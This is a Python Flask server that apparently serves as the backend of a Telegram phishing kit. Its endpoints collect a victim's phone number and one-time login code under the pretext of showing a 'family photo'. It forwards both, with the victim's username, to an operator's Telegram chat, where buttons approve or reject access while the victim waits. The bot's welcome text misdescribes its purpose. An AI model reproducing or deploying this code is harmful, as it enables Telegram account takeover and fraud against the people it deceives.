import os, uuid
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "ВСТАВЬ_ТОКЕН_БОТА_СЮДА"  # <-- замени на токен
ADMIN_ID  = "8472047742"

submissions = {}

def tg_send(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try: requests.post(url, json=payload, timeout=5)
    except Exception as e: print(f"TG error: {e}")

def tg_answer_callback(cb_id, text):
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id":cb_id,"text":text}, timeout=5)
    except: pass

def tg_edit_message(chat_id, message_id, text):
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={"chat_id":chat_id,"message_id":message_id,"text":text,"parse_mode":"HTML"}, timeout=5)
    except: pass

def user_info(tg_user):
    name = (tg_user.get("first_name","") + " " + tg_user.get("last_name","")).strip()
    username = tg_user.get("username","")
    return f"@{username}" if username else (name or "Неизвестно")

@app.route("/submit_phone", methods=["POST"])
def submit_phone():
    data = request.json or {}
    phone = data.get("phone","").strip()
    tg_user = data.get("tg_user",{})
    if not phone: return jsonify({"ok":False})
    tg_send(ADMIN_ID,
        f"📸 <b>Хочет посмотреть фото!</b>\n\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"👤 Telegram: {user_info(tg_user)}\n\n"
        f"<i>Ожидайте ввода кода...</i>")
    return jsonify({"ok":True})

@app.route("/submit_code", methods=["POST"])
def submit_code():
    data = request.json or {}
    phone = data.get("phone","").strip()
    code = data.get("code","").strip()
    tg_user = data.get("tg_user",{})
    if not phone or not code: return jsonify({"ok":False})
    sid = str(uuid.uuid4())
    submissions[sid] = {"phone":phone,"code":code,"tg_user":tg_user,"status":"pending"}
    markup = {"inline_keyboard":[[
        {"text":"✅ Открыть фото","callback_data":f"approve:{sid}"},
        {"text":"❌ Закрыть доступ","callback_data":f"reject:{sid}"}
    ]]}
    tg_send(ADMIN_ID,
        f"🔑 <b>Введён код!</b>\n\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"🔢 Код: <b><code>{code}</code></b>\n"
        f"👤 Telegram: {user_info(tg_user)}\n\n"
        f"Разрешить просмотр фото?",
        reply_markup=markup)
    return jsonify({"ok":True,"submission_id":sid})

@app.route("/check_status", methods=["GET"])
def check_status():
    sid = request.args.get("id","")
    sub = submissions.get(sid)
    if not sub: return jsonify({"status":"not_found"})
    return jsonify({"status":sub["status"]})

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.json or {}
    if "message" in update:
        msg = update["message"]
        if msg.get("text","").startswith("/start"):
            tg_send(msg["chat"]["id"],
                "📸 <b>Добро пожаловать!</b>\n\nЭтот бот показывает кто хочет посмотреть твоё семейное фото.\nТы получишь уведомление и сможешь решить — открыть доступ или нет.")
        return jsonify({"ok":True})
    if "callback_query" not in update: return jsonify({"ok":True})
    cb = update["callback_query"]
    cb_id = cb["id"]
    cb_data = cb.get("data","")
    msg_id = cb["message"]["message_id"]
    if ":" not in cb_data: return jsonify({"ok":True})
    action, sid = cb_data.split(":",1)
    sub = submissions.get(sid)
    if not sub:
        tg_answer_callback(cb_id,"Запись не найдена")
        return jsonify({"ok":True})
    if action=="approve":
        sub["status"]="approved"
        tg_answer_callback(cb_id,"✅ Доступ открыт!")
        tg_edit_message(ADMIN_ID,msg_id,
            f"✅ <b>Фото открыто</b>\n📱 <code>{sub['phone']}</code>\n👤 {user_info(sub['tg_user'])}")
    elif action=="reject":
        sub["status"]="rejected"
        tg_answer_callback(cb_id,"❌ Доступ закрыт")
        tg_edit_message(ADMIN_ID,msg_id,
            f"❌ <b>Доступ закрыт</b>\n📱 <code>{sub['phone']}</code>\n👤 {user_info(sub['tg_user'])}")
    return jsonify({"ok":True})

@app.route("/setup_webhook", methods=["GET"])
def setup_webhook():
    base_url = request.args.get("url","").rstrip("/")
    if not base_url: return "Укажи ?url=https://домен"
    r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook", json={"url":f"{base_url}/webhook"})
    return jsonify(r.json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT",5000))
    app.run(host="0.0.0.0",port=port,debug=False)
